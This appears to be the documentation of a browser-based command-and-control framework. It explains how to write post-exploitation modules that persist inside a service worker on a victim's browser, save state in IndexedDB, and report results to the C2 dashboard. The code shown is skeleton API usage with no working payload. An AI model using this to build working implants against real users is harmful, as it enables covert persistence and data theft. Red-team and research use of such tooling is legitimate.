# Create a custom post-exploitation module:
1. Create a JS with the MODULE_FILENAME.js under: `app/templates/modules`
2. If you plan to use IndexedDB to save current status or for whatever reasons, you will need to wake up the DB with:
```
WriteIDB("MODULE_NAME_init", 1);
```
3. You then need to register the module within the main SW on the victim. In this way, if the SW goes inactive and wakes up again, the module will resume execution:
```
registerModule('MODULE_NAME');
```
4. If you need to read previous saved data in IndexedDB, use the following:
```
var MODULE_NAME_data;
new Promise((res, rej) => {
  ReadIDB("MODULE_NAME", rej);
}).catch(function(p){
  if(p == undefined){
    MODULE_NAME_data = 1; // DEFAULT value
  }else{
    MODULE_NAME_data = p; // previous value
  }
});
```
5. After the initialisation, define your module logic:
```
function MODULE_NAME_Logic(){
	// do stuff....
}
MODULE_NAME_Logic();   // if you need to read data from IndexedDB first, call this in the IDB Promise catch section after querying the value(s)
```
6. You can use the module API `sendModuleResultToC2` to send data to the C2:
```
sendModuleResultToC2('MODULE_NAME', `data_from_module`);
```
7. At the end, you will need to deregister the module from the main SW. This will ensure that if the SW wakes up again, the module will not run a second time.
```
function MODULE_NAME_Logic(){
	// do stuff....
	deregisterModule('MODULE_NAME');
}
```
8. Note that all the global variable names need to be prefixed with your module name. Your module logic will end up being included as part of the main SW, so variables could conflict.
9. As a starting point for your module please refer to a module template under `app/templates/modules/template.js`.
10. Any results you send from the module will end up being visible on the dashboard under the agent that ran it.
11. If you want to run the module again after it has already been executed, you can delete the module against the agent on the dashboard and execute it again.
